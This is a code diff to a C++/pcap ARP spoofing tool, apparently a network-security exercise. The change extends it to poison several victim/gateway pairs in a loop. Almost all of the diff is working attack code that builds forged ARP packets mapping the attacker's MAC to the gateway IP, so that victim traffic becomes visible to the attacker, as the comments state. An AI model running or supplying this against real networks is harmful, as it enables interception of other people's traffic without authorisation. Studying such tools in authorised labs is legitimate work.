@@ -83,15 +83,13 @@ string send_arp(string vicIp){
 	return NULL;
 }
 
-int main(int argc,	char* argv[]) {
-	if (argc != 4) {
+int main(int argc, char* argv[]) {
+	if (argc < 4 || (argc - 2) % 2 != 0) {
 		usage();
 		return -1;
 	}
 
 	char* interf = argv[1]; //interface
-	string vicIp = argv[2]; //sender ip
-	string gateIp = argv[3]; //target ip
 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	handle = pcap_open_live(interf, BUFSIZ, 1, 1, errbuf);
@@ -100,48 +98,54 @@ int main(int argc,	char* argv[]) {
 		return -1;
 	}
 
-	EthArpPacket packet;
+	// Get my(attacker)'s address
 	string interface = interf;
-
-	//get my(attacker)'s address
 	myIp = get_ip(interface);
-	myMac = get_mac(interface); 
+	myMac = get_mac(interface);
 
-	string vicMac = send_arp(vicIp);
+	// Process each (Sender, Target) pair
+	for (int i = 2; i < argc; i += 2) {
+		string vicIp = argv[i];      // Sender IP
+		string gateIp = argv[i + 1]; // Target IP
 
-	packet.eth_.smac_ = Mac(myMac);
-	packet.eth_.dmac_ = Mac(vicMac);
-	packet.eth_.type_ = htons(EthHdr::Arp);
+		string vicMac = send_arp(vicIp);
 
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
+		EthArpPacket packet;
+		packet.eth_.smac_ = Mac(myMac);
+		packet.eth_.dmac_ = Mac(vicMac);
+		packet.eth_.type_ = htons(EthHdr::Arp);
 
-	packet.arp_.op_ = htons(ArpHdr::Request);
-	//My mac
-	packet.arp_.smac_ = Mac(myMac);
-	//target ip(gateway)
-	packet.arp_.sip_ = htonl(Ip(gateIp));
-	
-	//Victim
-	packet.arp_.tmac_ = Mac(vicMac);
-	packet.arp_.tip_ = htonl(Ip(gateIp)); 
+		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+		packet.arp_.pro_ = htons(EthHdr::Ip4);
+		packet.arp_.hln_ = Mac::SIZE;
+		packet.arp_.pln_ = Ip::SIZE;
 
-	/*
-	result
+		packet.arp_.op_ = htons(ArpHdr::Request);
+		// My mac
+		packet.arp_.smac_ = Mac(myMac);
+		// Target ip(gateway)
+		packet.arp_.sip_ = htonl(Ip(gateIp));
 
-	victim's arp table
-	myMac:targetIP
+		// Victim
+		packet.arp_.tmac_ = Mac(vicMac);
+		packet.arp_.tip_ = htonl(Ip(gateIp));
 
-	if victim connet to externel, that packet is visible to me
-	*/
+		/*
+		result
 
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	printf("sent arp spoofing\n");
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		victim's arp table
+		myMac:targetIP
+
+		if victim connects to external, that packet is visible to me
+		*/
+
+		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+		printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", vicIp.c_str(), gateIp.c_str());
+		if (res != 0) {
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		}
 	}
 
 	pcap_close(handle);
 }
+
